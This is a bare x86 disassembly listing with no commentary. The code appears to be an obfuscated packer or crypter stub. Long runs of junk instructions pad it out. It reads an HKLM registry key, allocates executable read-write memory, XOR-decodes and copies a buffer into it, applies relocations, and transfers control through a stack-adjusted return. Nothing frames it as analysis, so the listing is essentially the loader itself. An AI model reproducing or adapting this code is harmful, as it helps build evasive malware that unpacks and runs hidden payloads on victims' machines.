  44de0e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de15:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de1c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de23:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de2a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de31:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de38:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de3f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de46:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de4d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de54:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de5b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de62:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de69:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de70:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de77:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de7e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de85:	mov    eax,DWORD PTR [ebp+0x8]
  44de88:	cmp    DWORD PTR [eax+0x4],0x0
  44de8c:	je     0x44e289
  44de92:	mov    DWORD PTR [ebp-0xc],0x1024a
  44de99:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dea0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dea7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44deae:	mov    DWORD PTR [ebp-0xc],0x1024a
  44deb5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44debc:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dec3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44deca:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ded1:	mov    DWORD PTR [ebp-0xc],0x1024a
  44ded8:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dedf:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dee6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44deed:	mov    DWORD PTR [ebp-0xc],0x1024a
  44def4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44defb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df02:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df09:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df10:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df17:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df1e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df25:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df2c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df33:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df3a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df41:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df48:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df4f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df56:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df5d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df64:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df6b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df72:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df79:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df80:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df87:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df8e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df95:	mov    DWORD PTR [ebp-0xc],0x1024a
  44df9c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfa3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfaa:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfb1:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfb8:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfbf:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfc6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfcd:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfd4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfdb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfe2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dfe9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dff0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dff7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44dffe:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e005:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e00c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e013:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e01a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e021:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e028:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e02f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e036:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e03d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e044:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e04b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e052:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e059:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e060:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e067:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e06e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e075:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e07c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e083:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e08a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e091:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e098:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e09f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0a6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0ad:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0b4:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0bb:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0c2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0c9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0d0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0d7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0de:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0e5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0ec:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0f3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e0fa:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e101:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e108:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e10f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e116:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e11d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e124:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e12b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e132:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e139:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e140:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e147:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e14e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e155:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e15c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e163:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e16a:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e171:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e178:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e17f:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e186:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e18d:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e194:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e19b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1a2:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1a9:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1b0:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1b7:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1be:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1c5:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1cc:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1d3:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1da:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1e1:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1e8:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1ef:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1f6:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e1fd:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e204:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e20b:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e212:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e219:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e220:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e227:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e22e:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e235:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e23c:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e243:	mov    DWORD PTR [ebp-0xc],0x1024a
  44e24a:	mov    ecx,DWORD PTR [ebp+0x8]
  44e24d:	add    ecx,0x8
  44e250:	mov    DWORD PTR ds:0x452228,ecx
  44e256:	mov    edx,DWORD PTR [ebp+0x8]
  44e259:	mov    eax,DWORD PTR [edx+0x4]
  44e25c:	mov    ds:0x45221c,eax
  44e261:	call   0x44d640
  44e266:	mov    ecx,DWORD PTR [ebp+0x8]
  44e269:	mov    DWORD PTR ds:0x452218,ecx
  44e26f:	mov    edx,DWORD PTR [ebp+0x10]
  44e272:	push   edx
  44e273:	mov    eax,DWORD PTR [ebp+0xc]
  44e276:	push   eax
  44e277:	push   0x1
  44e279:	call   0x44d4e0
  44e27e:	add    esp,0xc
  44e281:	mov    DWORD PTR [ebp+0x8],eax
  44e284:	jmp    0x44de85
  44e289:	mov    esp,ebp
  44e28b:	pop    ebp
  44e28c:	ret    
  44e28d:	int3   
  44e28e:	int3   
  44e28f:	int3   
  44e290:	push   ebp
  44e291:	mov    ebp,esp
  44e293:	sub    esp,0x7c
  44e296:	push   ebx
  44e297:	push   esi
  44e298:	push   edi
  44e299:	mov    DWORD PTR [ebp-0x28],0x44da20
  44e2a0:	mov    DWORD PTR ds:0x452220,ebp
  44e2a6:	mov    DWORD PTR [ebp-0x2c],0x0
  44e2ad:	mov    DWORD PTR [ebp-0x3c],0x80000002
  44e2b4:	mov    DWORD PTR [ebp-0x6c],0x451000
  44e2bb:	mov    eax,ds:0x45149c
  44e2c0:	mov    DWORD PTR [ebp-0x64],eax
  44e2c3:	mov    DWORD PTR [ebp-0xc],0x1471
  44e2ca:	mov    DWORD PTR [ebp-0xc],0x1471
  44e2d1:	mov    ecx,DWORD PTR ds:0x451634
  44e2d7:	mov    DWORD PTR [ebp-0x60],ecx
  44e2da:	lea    edx,[ebp-0x68]
  44e2dd:	push   edx
  44e2de:	push   0x20019
  44e2e3:	push   0x0
  44e2e5:	push   0x451030
  44e2ea:	push   0x80000002
  44e2ef:	call   DWORD PTR [ebp-0x60]
  44e2f2:	test   eax,eax
  44e2f4:	jne    0x44e305
  44e2f6:	push   0x0
  44e2f8:	call   DWORD PTR ds:0x451490
  44e2fe:	xor    eax,eax
  44e300:	jmp    0x44e540
  44e305:	lea    eax,[ebp-0x68]
  44e308:	push   eax
  44e309:	push   0x20019
  44e30e:	push   0x0
  44e310:	mov    ecx,DWORD PTR [ebp-0x6c]
  44e313:	push   ecx
  44e314:	push   0x80000002
  44e319:	call   DWORD PTR [ebp-0x60]
  44e31c:	test   eax,eax
  44e31e:	je     0x44e32f
  44e320:	push   0x0
  44e322:	call   DWORD PTR ds:0x451490
  44e328:	xor    eax,eax
  44e32a:	jmp    0x44e540
  44e32f:	call   0x44da60
  44e334:	mov    edx,DWORD PTR ds:0x45220c
  44e33a:	push   edx
  44e33b:	call   0x44d430
  44e340:	add    esp,0x4
  44e343:	mov    ds:0x452204,eax
  44e348:	mov    eax,ds:0x452204
  44e34d:	push   eax
  44e34e:	call   0x44e730
  44e353:	add    esp,0x4
  44e356:	mov    ds:0x45222c,eax
  44e35b:	mov    ecx,DWORD PTR ds:0x452204
  44e361:	mov    DWORD PTR [ebp-0x34],ecx
  44e364:	mov    DWORD PTR [ebp-0x24],0x64
  44e36b:	mov    DWORD PTR [ebp-0x14],0x1
  44e372:	mov    DWORD PTR [ebp-0x2c],0x0
  44e379:	mov    DWORD PTR [ebp-0x18],0x0
  44e380:	mov    DWORD PTR [ebp-0x20],0x1
  44e387:	mov    DWORD PTR [ebp-0xc],0x0
  44e38e:	mov    edx,DWORD PTR [ebp-0x2c]
  44e391:	cmp    edx,DWORD PTR ds:0x452204
  44e397:	jae    0x44e3eb
  44e399:	mov    eax,DWORD PTR [ebp-0x34]
  44e39c:	push   eax
  44e39d:	mov    ecx,DWORD PTR [ebp-0x24]
  44e3a0:	push   ecx
  44e3a1:	call   0x44d4a0
  44e3a6:	add    esp,0x8
  44e3a9:	mov    DWORD PTR [ebp-0x38],eax
  44e3ac:	mov    edx,DWORD PTR [ebp-0x38]
  44e3af:	push   edx
  44e3b0:	mov    eax,ds:0x45220c
  44e3b5:	add    eax,DWORD PTR [ebp-0x18]
  44e3b8:	push   eax
  44e3b9:	mov    ecx,DWORD PTR ds:0x45222c
  44e3bf:	add    ecx,DWORD PTR [ebp-0x2c]
  44e3c2:	push   ecx
  44e3c3:	call   0x44e680
  44e3c8:	add    esp,0xc
  44e3cb:	mov    edx,DWORD PTR [ebp-0x14]
  44e3ce:	add    edx,DWORD PTR [ebp-0x24]
  44e3d1:	add    edx,DWORD PTR [ebp-0x18]
  44e3d4:	mov    DWORD PTR [ebp-0x18],edx
  44e3d7:	mov    eax,DWORD PTR [ebp-0x2c]
  44e3da:	add    eax,DWORD PTR [ebp-0x24]
  44e3dd:	mov    DWORD PTR [ebp-0x2c],eax
  44e3e0:	mov    ecx,DWORD PTR [ebp-0x34]
  44e3e3:	sub    ecx,DWORD PTR [ebp-0x38]
  44e3e6:	mov    DWORD PTR [ebp-0x34],ecx
  44e3e9:	jmp    0x44e38e
  44e3eb:	mov    edx,DWORD PTR ds:0x452204
  44e3f1:	push   edx
  44e3f2:	mov    eax,ds:0x45222c
  44e3f7:	push   eax
  44e3f8:	call   0x44e550
  44e3fd:	add    esp,0x8
  44e400:	pusha  
  44e401:	mov    DWORD PTR [ebp-0x18],0x0
  44e408:	mov    DWORD PTR [ebp-0x70],0x0
  44e40f:	mov    ecx,DWORD PTR ds:0x452204
  44e415:	push   ecx
  44e416:	push   0x0
  44e418:	mov    edx,DWORD PTR ds:0x452208
  44e41e:	push   edx
  44e41f:	call   0x44d3e0
  44e424:	add    esp,0xc
  44e427:	mov    eax,ds:0x452204
  44e42c:	mov    DWORD PTR [ebp-0x78],eax
  44e42f:	mov    ecx,DWORD PTR [ebp-0x70]
  44e432:	cmp    ecx,DWORD PTR ds:0x452204
  44e438:	jae    0x44e48c
  44e43a:	mov    edx,DWORD PTR [ebp-0x78]
  44e43d:	push   edx
  44e43e:	mov    eax,DWORD PTR [ebp-0x24]
  44e441:	push   eax
  44e442:	call   0x44d4a0
  44e447:	add    esp,0x8
  44e44a:	mov    DWORD PTR [ebp-0x7c],eax
  44e44d:	mov    ecx,DWORD PTR [ebp-0x7c]
  44e450:	push   ecx
  44e451:	mov    edx,DWORD PTR ds:0x45220c
  44e457:	add    edx,DWORD PTR [ebp-0x18]
  44e45a:	push   edx
  44e45b:	mov    eax,ds:0x452208
  44e460:	add    eax,DWORD PTR [ebp-0x70]
  44e463:	push   eax
  44e464:	call   0x44e680
  44e469:	add    esp,0xc
  44e46c:	mov    ecx,DWORD PTR [ebp-0x14]
  44e46f:	add    ecx,DWORD PTR [ebp-0x24]
  44e472:	add    ecx,DWORD PTR [ebp-0x18]
  44e475:	mov    DWORD PTR [ebp-0x18],ecx
  44e478:	mov    edx,DWORD PTR [ebp-0x70]
  44e47b:	add    edx,DWORD PTR [ebp-0x24]
  44e47e:	mov    DWORD PTR [ebp-0x70],edx
  44e481:	mov    eax,DWORD PTR [ebp-0x78]
  44e484:	sub    eax,DWORD PTR [ebp-0x7c]
  44e487:	mov    DWORD PTR [ebp-0x78],eax
  44e48a:	jmp    0x44e42f
  44e48c:	mov    ecx,DWORD PTR ds:0x452204
  44e492:	push   ecx
  44e493:	mov    edx,DWORD PTR ds:0x452208
  44e499:	push   edx
  44e49a:	call   0x44e550
  44e49f:	add    esp,0x8
  44e4a2:	mov    DWORD PTR [ebp-0x28],0x44da20
  44e4a9:	mov    eax,ds:0x45222c
  44e4ae:	mov    ecx,DWORD PTR ds:0x452208
  44e4b4:	mov    DWORD PTR [eax],ecx
  44e4b6:	push   0x4d000
  44e4bb:	call   0x44e730
  44e4c0:	add    esp,0x4
  44e4c3:	mov    ds:0x452230,eax
  44e4c8:	mov    edx,DWORD PTR ds:0x452230
  44e4ce:	add    edx,0x300
  44e4d4:	mov    DWORD PTR ds:0x452234,edx
  44e4da:	push   0x4af00
  44e4df:	mov    eax,ds:0x45222c
  44e4e4:	push   eax
  44e4e5:	mov    ecx,DWORD PTR ds:0x452234
  44e4eb:	push   ecx
  44e4ec:	call   0x44e680
  44e4f1:	add    esp,0xc
  44e4f4:	mov    edx,DWORD PTR ds:0x452230
  44e4fa:	add    edx,0x4aea0
  44e500:	mov    DWORD PTR ds:0x452224,edx
  44e506:	mov    ecx,ecx
  44e508:	mov    ecx,ecx
  44e50a:	mov    ecx,ecx
  44e50c:	popa   
  44e50d:	mov    ecx,ecx
  44e50f:	mov    ecx,ecx
  44e511:	mov    ecx,ecx
  44e513:	mov    ecx,ecx
  44e515:	push   0xde9b
  44e51a:	mov    eax,DWORD PTR [ebp-0x28]
  44e51d:	mov    ecx,ecx
  44e51f:	mov    ecx,ecx
  44e521:	mov    ecx,esp
  44e523:	push   edx
  44e524:	mov    edx,ecx
  44e526:	sub    edx,0x26
  44e529:	mov    ecx,edx
  44e52b:	pop    edx
  44e52c:	add    ecx,0x22
  44e52f:	mov    ecx,ecx
  44e531:	mov    DWORD PTR [ecx+0x4],0x0
  44e538:	mov    ecx,ecx
  44e53a:	add    DWORD PTR [ecx+0x4],eax
  44e53d:	ret    
  44e53e:	xor    eax,eax
  44e540:	pop    edi
  44e541:	pop    esi
  44e542:	pop    ebx
  44e543:	mov    esp,ebp
  44e545:	pop    ebp
  44e546:	ret    
  44e547:	int3   
  44e548:	int3   
  44e549:	int3   
  44e54a:	int3   
  44e54b:	int3   
  44e54c:	int3   
  44e54d:	int3   
  44e54e:	int3   
  44e54f:	int3   
  44e550:	push   ebp
  44e551:	mov    ebp,esp
  44e553:	sub    esp,0x10
  44e556:	mov    DWORD PTR [ebp-0x4],0x0
  44e55d:	jmp    0x44e568
  44e55f:	mov    eax,DWORD PTR [ebp-0x4]
  44e562:	add    eax,0x4
  44e565:	mov    DWORD PTR [ebp-0x4],eax
  44e568:	mov    ecx,DWORD PTR [ebp-0x4]
  44e56b:	cmp    ecx,DWORD PTR [ebp+0xc]
  44e56e:	jae    0x44e60b
  44e574:	mov    DWORD PTR [ebp-0x8],0xc842
  44e57b:	mov    DWORD PTR [ebp-0x8],0xc842
  44e582:	mov    DWORD PTR [ebp-0x8],0xc842
  44e589:	mov    edx,DWORD PTR [ebp-0x4]
  44e58c:	add    edx,0xd962
  44e592:	mov    DWORD PTR ds:0x452238,edx
  44e598:	mov    DWORD PTR [ebp-0x8],0xc842
  44e59f:	mov    eax,DWORD PTR [ebp+0x8]
  44e5a2:	add    eax,DWORD PTR [ebp-0x4]
  44e5a5:	mov    DWORD PTR [ebp-0x10],eax
  44e5a8:	mov    DWORD PTR [ebp-0x8],0xc842
  44e5af:	mov    DWORD PTR [ebp-0x8],0xc842
  44e5b6:	mov    DWORD PTR [ebp-0x8],0xc842
  44e5bd:	mov    ecx,DWORD PTR [ebp-0x10]
  44e5c0:	mov    DWORD PTR [ebp-0xc],ecx
  44e5c3:	mov    edx,DWORD PTR ds:0x452238
  44e5c9:	mov    DWORD PTR [ebp-0x8],edx
  44e5cc:	mov    DWORD PTR [ebp-0x8],0xc842
  44e5d3:	mov    eax,DWORD PTR [ebp-0x10]
  44e5d6:	mov    ecx,DWORD PTR [eax]
  44e5d8:	add    ecx,DWORD PTR [ebp-0x4]
  44e5db:	mov    edx,DWORD PTR [ebp-0x10]
  44e5de:	mov    DWORD PTR [edx],ecx
  44e5e0:	mov    eax,DWORD PTR [ebp-0xc]
  44e5e3:	mov    ecx,DWORD PTR [eax]
  44e5e5:	mov    DWORD PTR [ebp-0x8],ecx
  44e5e8:	mov    edx,DWORD PTR ds:0x452238
  44e5ee:	push   edx
  44e5ef:	mov    eax,DWORD PTR [ebp-0x8]
  44e5f2:	push   eax
  44e5f3:	call   0x44e610
  44e5f8:	add    esp,0x8
  44e5fb:	mov    DWORD PTR [ebp-0x8],eax
  44e5fe:	mov    ecx,DWORD PTR [ebp-0xc]
  44e601:	mov    edx,DWORD PTR [ebp-0x8]
  44e604:	mov    DWORD PTR [ecx],edx
  44e606:	jmp    0x44e55f
  44e60b:	mov    esp,ebp
  44e60d:	pop    ebp
  44e60e:	ret    
  44e60f:	int3   
  44e610:	push   ebp
  44e611:	mov    ebp,esp
  44e613:	sub    esp,0x14
  44e616:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e61d:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e624:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e62b:	mov    eax,DWORD PTR [ebp+0x8]
  44e62e:	xor    eax,DWORD PTR [ebp+0xc]
  44e631:	mov    DWORD PTR [ebp-0x10],eax
  44e634:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e63b:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e642:	mov    ecx,DWORD PTR [ebp+0xc]
  44e645:	mov    DWORD PTR [ebp-0x4],ecx
  44e648:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e64f:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e656:	mov    edx,DWORD PTR [ebp+0x8]
  44e659:	mov    DWORD PTR [ebp-0xc],edx
  44e65c:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e663:	mov    DWORD PTR [ebp-0x8],0xdd7
  44e66a:	mov    eax,DWORD PTR [ebp-0x10]
  44e66d:	mov    DWORD PTR [ebp-0x14],eax
  44e670:	mov    eax,DWORD PTR [ebp-0x14]
  44e673:	mov    esp,ebp
  44e675:	pop    ebp
  44e676:	ret    
  44e677:	int3   
  44e678:	int3   
  44e679:	int3   
  44e67a:	int3   
  44e67b:	int3   
  44e67c:	int3   
  44e67d:	int3   
  44e67e:	int3   
  44e67f:	int3   
  44e680:	push   ebp
  44e681:	mov    ebp,esp
  44e683:	sub    esp,0x8
  44e686:	mov    DWORD PTR [ebp-0x4],0x0
  44e68d:	jmp    0x44e698
  44e68f:	mov    eax,DWORD PTR [ebp-0x4]
  44e692:	add    eax,0x1
  44e695:	mov    DWORD PTR [ebp-0x4],eax
  44e698:	mov    ecx,DWORD PTR [ebp-0x4]
  44e69b:	cmp    ecx,DWORD PTR [ebp+0x10]
  44e69e:	jge    0x44e6ff
  44e6a0:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6a7:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6ae:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6b5:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6bc:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6c3:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6ca:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6d1:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6d8:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6df:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6e6:	mov    DWORD PTR [ebp-0x8],0x889bb
  44e6ed:	mov    edx,DWORD PTR [ebp+0x8]
  44e6f0:	add    edx,DWORD PTR [ebp-0x4]
  44e6f3:	mov    eax,DWORD PTR [ebp+0xc]
  44e6f6:	add    eax,DWORD PTR [ebp-0x4]
  44e6f9:	mov    cl,BYTE PTR [eax]
  44e6fb:	mov    BYTE PTR [edx],cl
  44e6fd:	jmp    0x44e68f
  44e6ff:	mov    edx,DWORD PTR [ebp+0x8]
  44e702:	cmp    edx,DWORD PTR ds:0x452234
  44e708:	jne    0x44e72b
  44e70a:	mov    eax,ds:0x452230
  44e70f:	sub    eax,0x400000
  44e714:	push   eax
  44e715:	mov    ecx,DWORD PTR ds:0x452230
  44e71b:	push   ecx
  44e71c:	mov    edx,DWORD PTR ds:0x452208
  44e722:	push   edx
  44e723:	call   0x44dac0
  44e728:	add    esp,0xc
  44e72b:	mov    esp,ebp
  44e72d:	pop    ebp
  44e72e:	ret    
  44e72f:	int3   
  44e730:	push   ebp
  44e731:	mov    ebp,esp
  44e733:	sub    esp,0x238
  44e739:	mov    DWORD PTR [ebp-0x1c],0x307c
  44e740:	mov    DWORD PTR [ebp-0x238],0x3000
  44e74a:	mov    DWORD PTR [ebp-0x18],0x40
  44e751:	mov    DWORD PTR [ebp-0x22c],0x0
  44e75b:	mov    DWORD PTR [ebp-0x230],0x0
  44e765:	mov    DWORD PTR [ebp-0x14],0x0
  44e76c:	lea    eax,[ebp-0x14]
  44e76f:	push   eax
  44e770:	push   0x0
  44e772:	call   DWORD PTR ds:0x451438
  44e778:	cmp    DWORD PTR [ebp-0x14],0x0
  44e77c:	jne    0x44e782
  44e77e:	xor    eax,eax
  44e780:	jmp    0x44e79e
  44e782:	mov    ecx,DWORD PTR [ebp-0x18]
  44e785:	push   ecx
  44e786:	mov    edx,DWORD PTR [ebp-0x238]
  44e78c:	push   edx
  44e78d:	mov    eax,DWORD PTR [ebp+0x8]
  44e790:	push   eax
  44e791:	mov    ecx,DWORD PTR [ebp-0x22c]
  44e797:	push   ecx
  44e798:	call   DWORD PTR ds:0x451478
  44e79e:	mov    esp,ebp
  44e7a0:	pop    ebp
  44e7a1:	ret    
  44e7a2:	int3   
  44e7a3:	int3   
  44e7a4:	int3   
  44e7a5:	int3   
  44e7a6:	int3   
  44e7a7:	int3   
  44e7a8:	int3   
  44e7a9:	int3   
  44e7aa:	int3   
  44e7ab:	int3   
  44e7ac:	int3   
  44e7ad:	int3   
  44e7ae:	int3   
  44e7af:	int3   
  44e7b0:	push   ebp
  44e7b1:	mov    ebp,esp
  44e7b3:	sub    esp,0xc
  44e7b6:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7bd:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7c4:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7cb:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7d2:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7d9:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7e0:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7e7:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7ee:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7f5:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e7fc:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e803:	mov    DWORD PTR [ebp-0x4],0x0
  44e80a:	jmp    0x44e815
  44e80c:	mov    eax,DWORD PTR [ebp-0x4]
  44e80f:	add    eax,0x1
  44e812:	mov    DWORD PTR [ebp-0x4],eax
  44e815:	mov    ecx,DWORD PTR [ebp-0x4]
  44e818:	cmp    ecx,DWORD PTR ds:0x45221c
  44e81e:	jae    0x44e90c
  44e824:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e82b:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e832:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e839:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e840:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e847:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e84e:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e855:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e85c:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e863:	mov    edx,DWORD PTR [ebp-0x4]
  44e866:	push   edx
  44e867:	mov    eax,ds:0x452228
  44e86c:	push   eax
  44e86d:	call   0x44d440
  44e872:	add    esp,0x8
  44e875:	sar    eax,0xc
  44e878:	cmp    eax,0x3
  44e87b:	jne    0x44e907
  44e881:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e888:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e88f:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e896:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e89d:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e8a4:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e8ab:	mov    DWORD PTR [ebp-0xc],0x889bb
  44e8b2:	mov    DWORD PTR [ebp-0xc],0x889bb
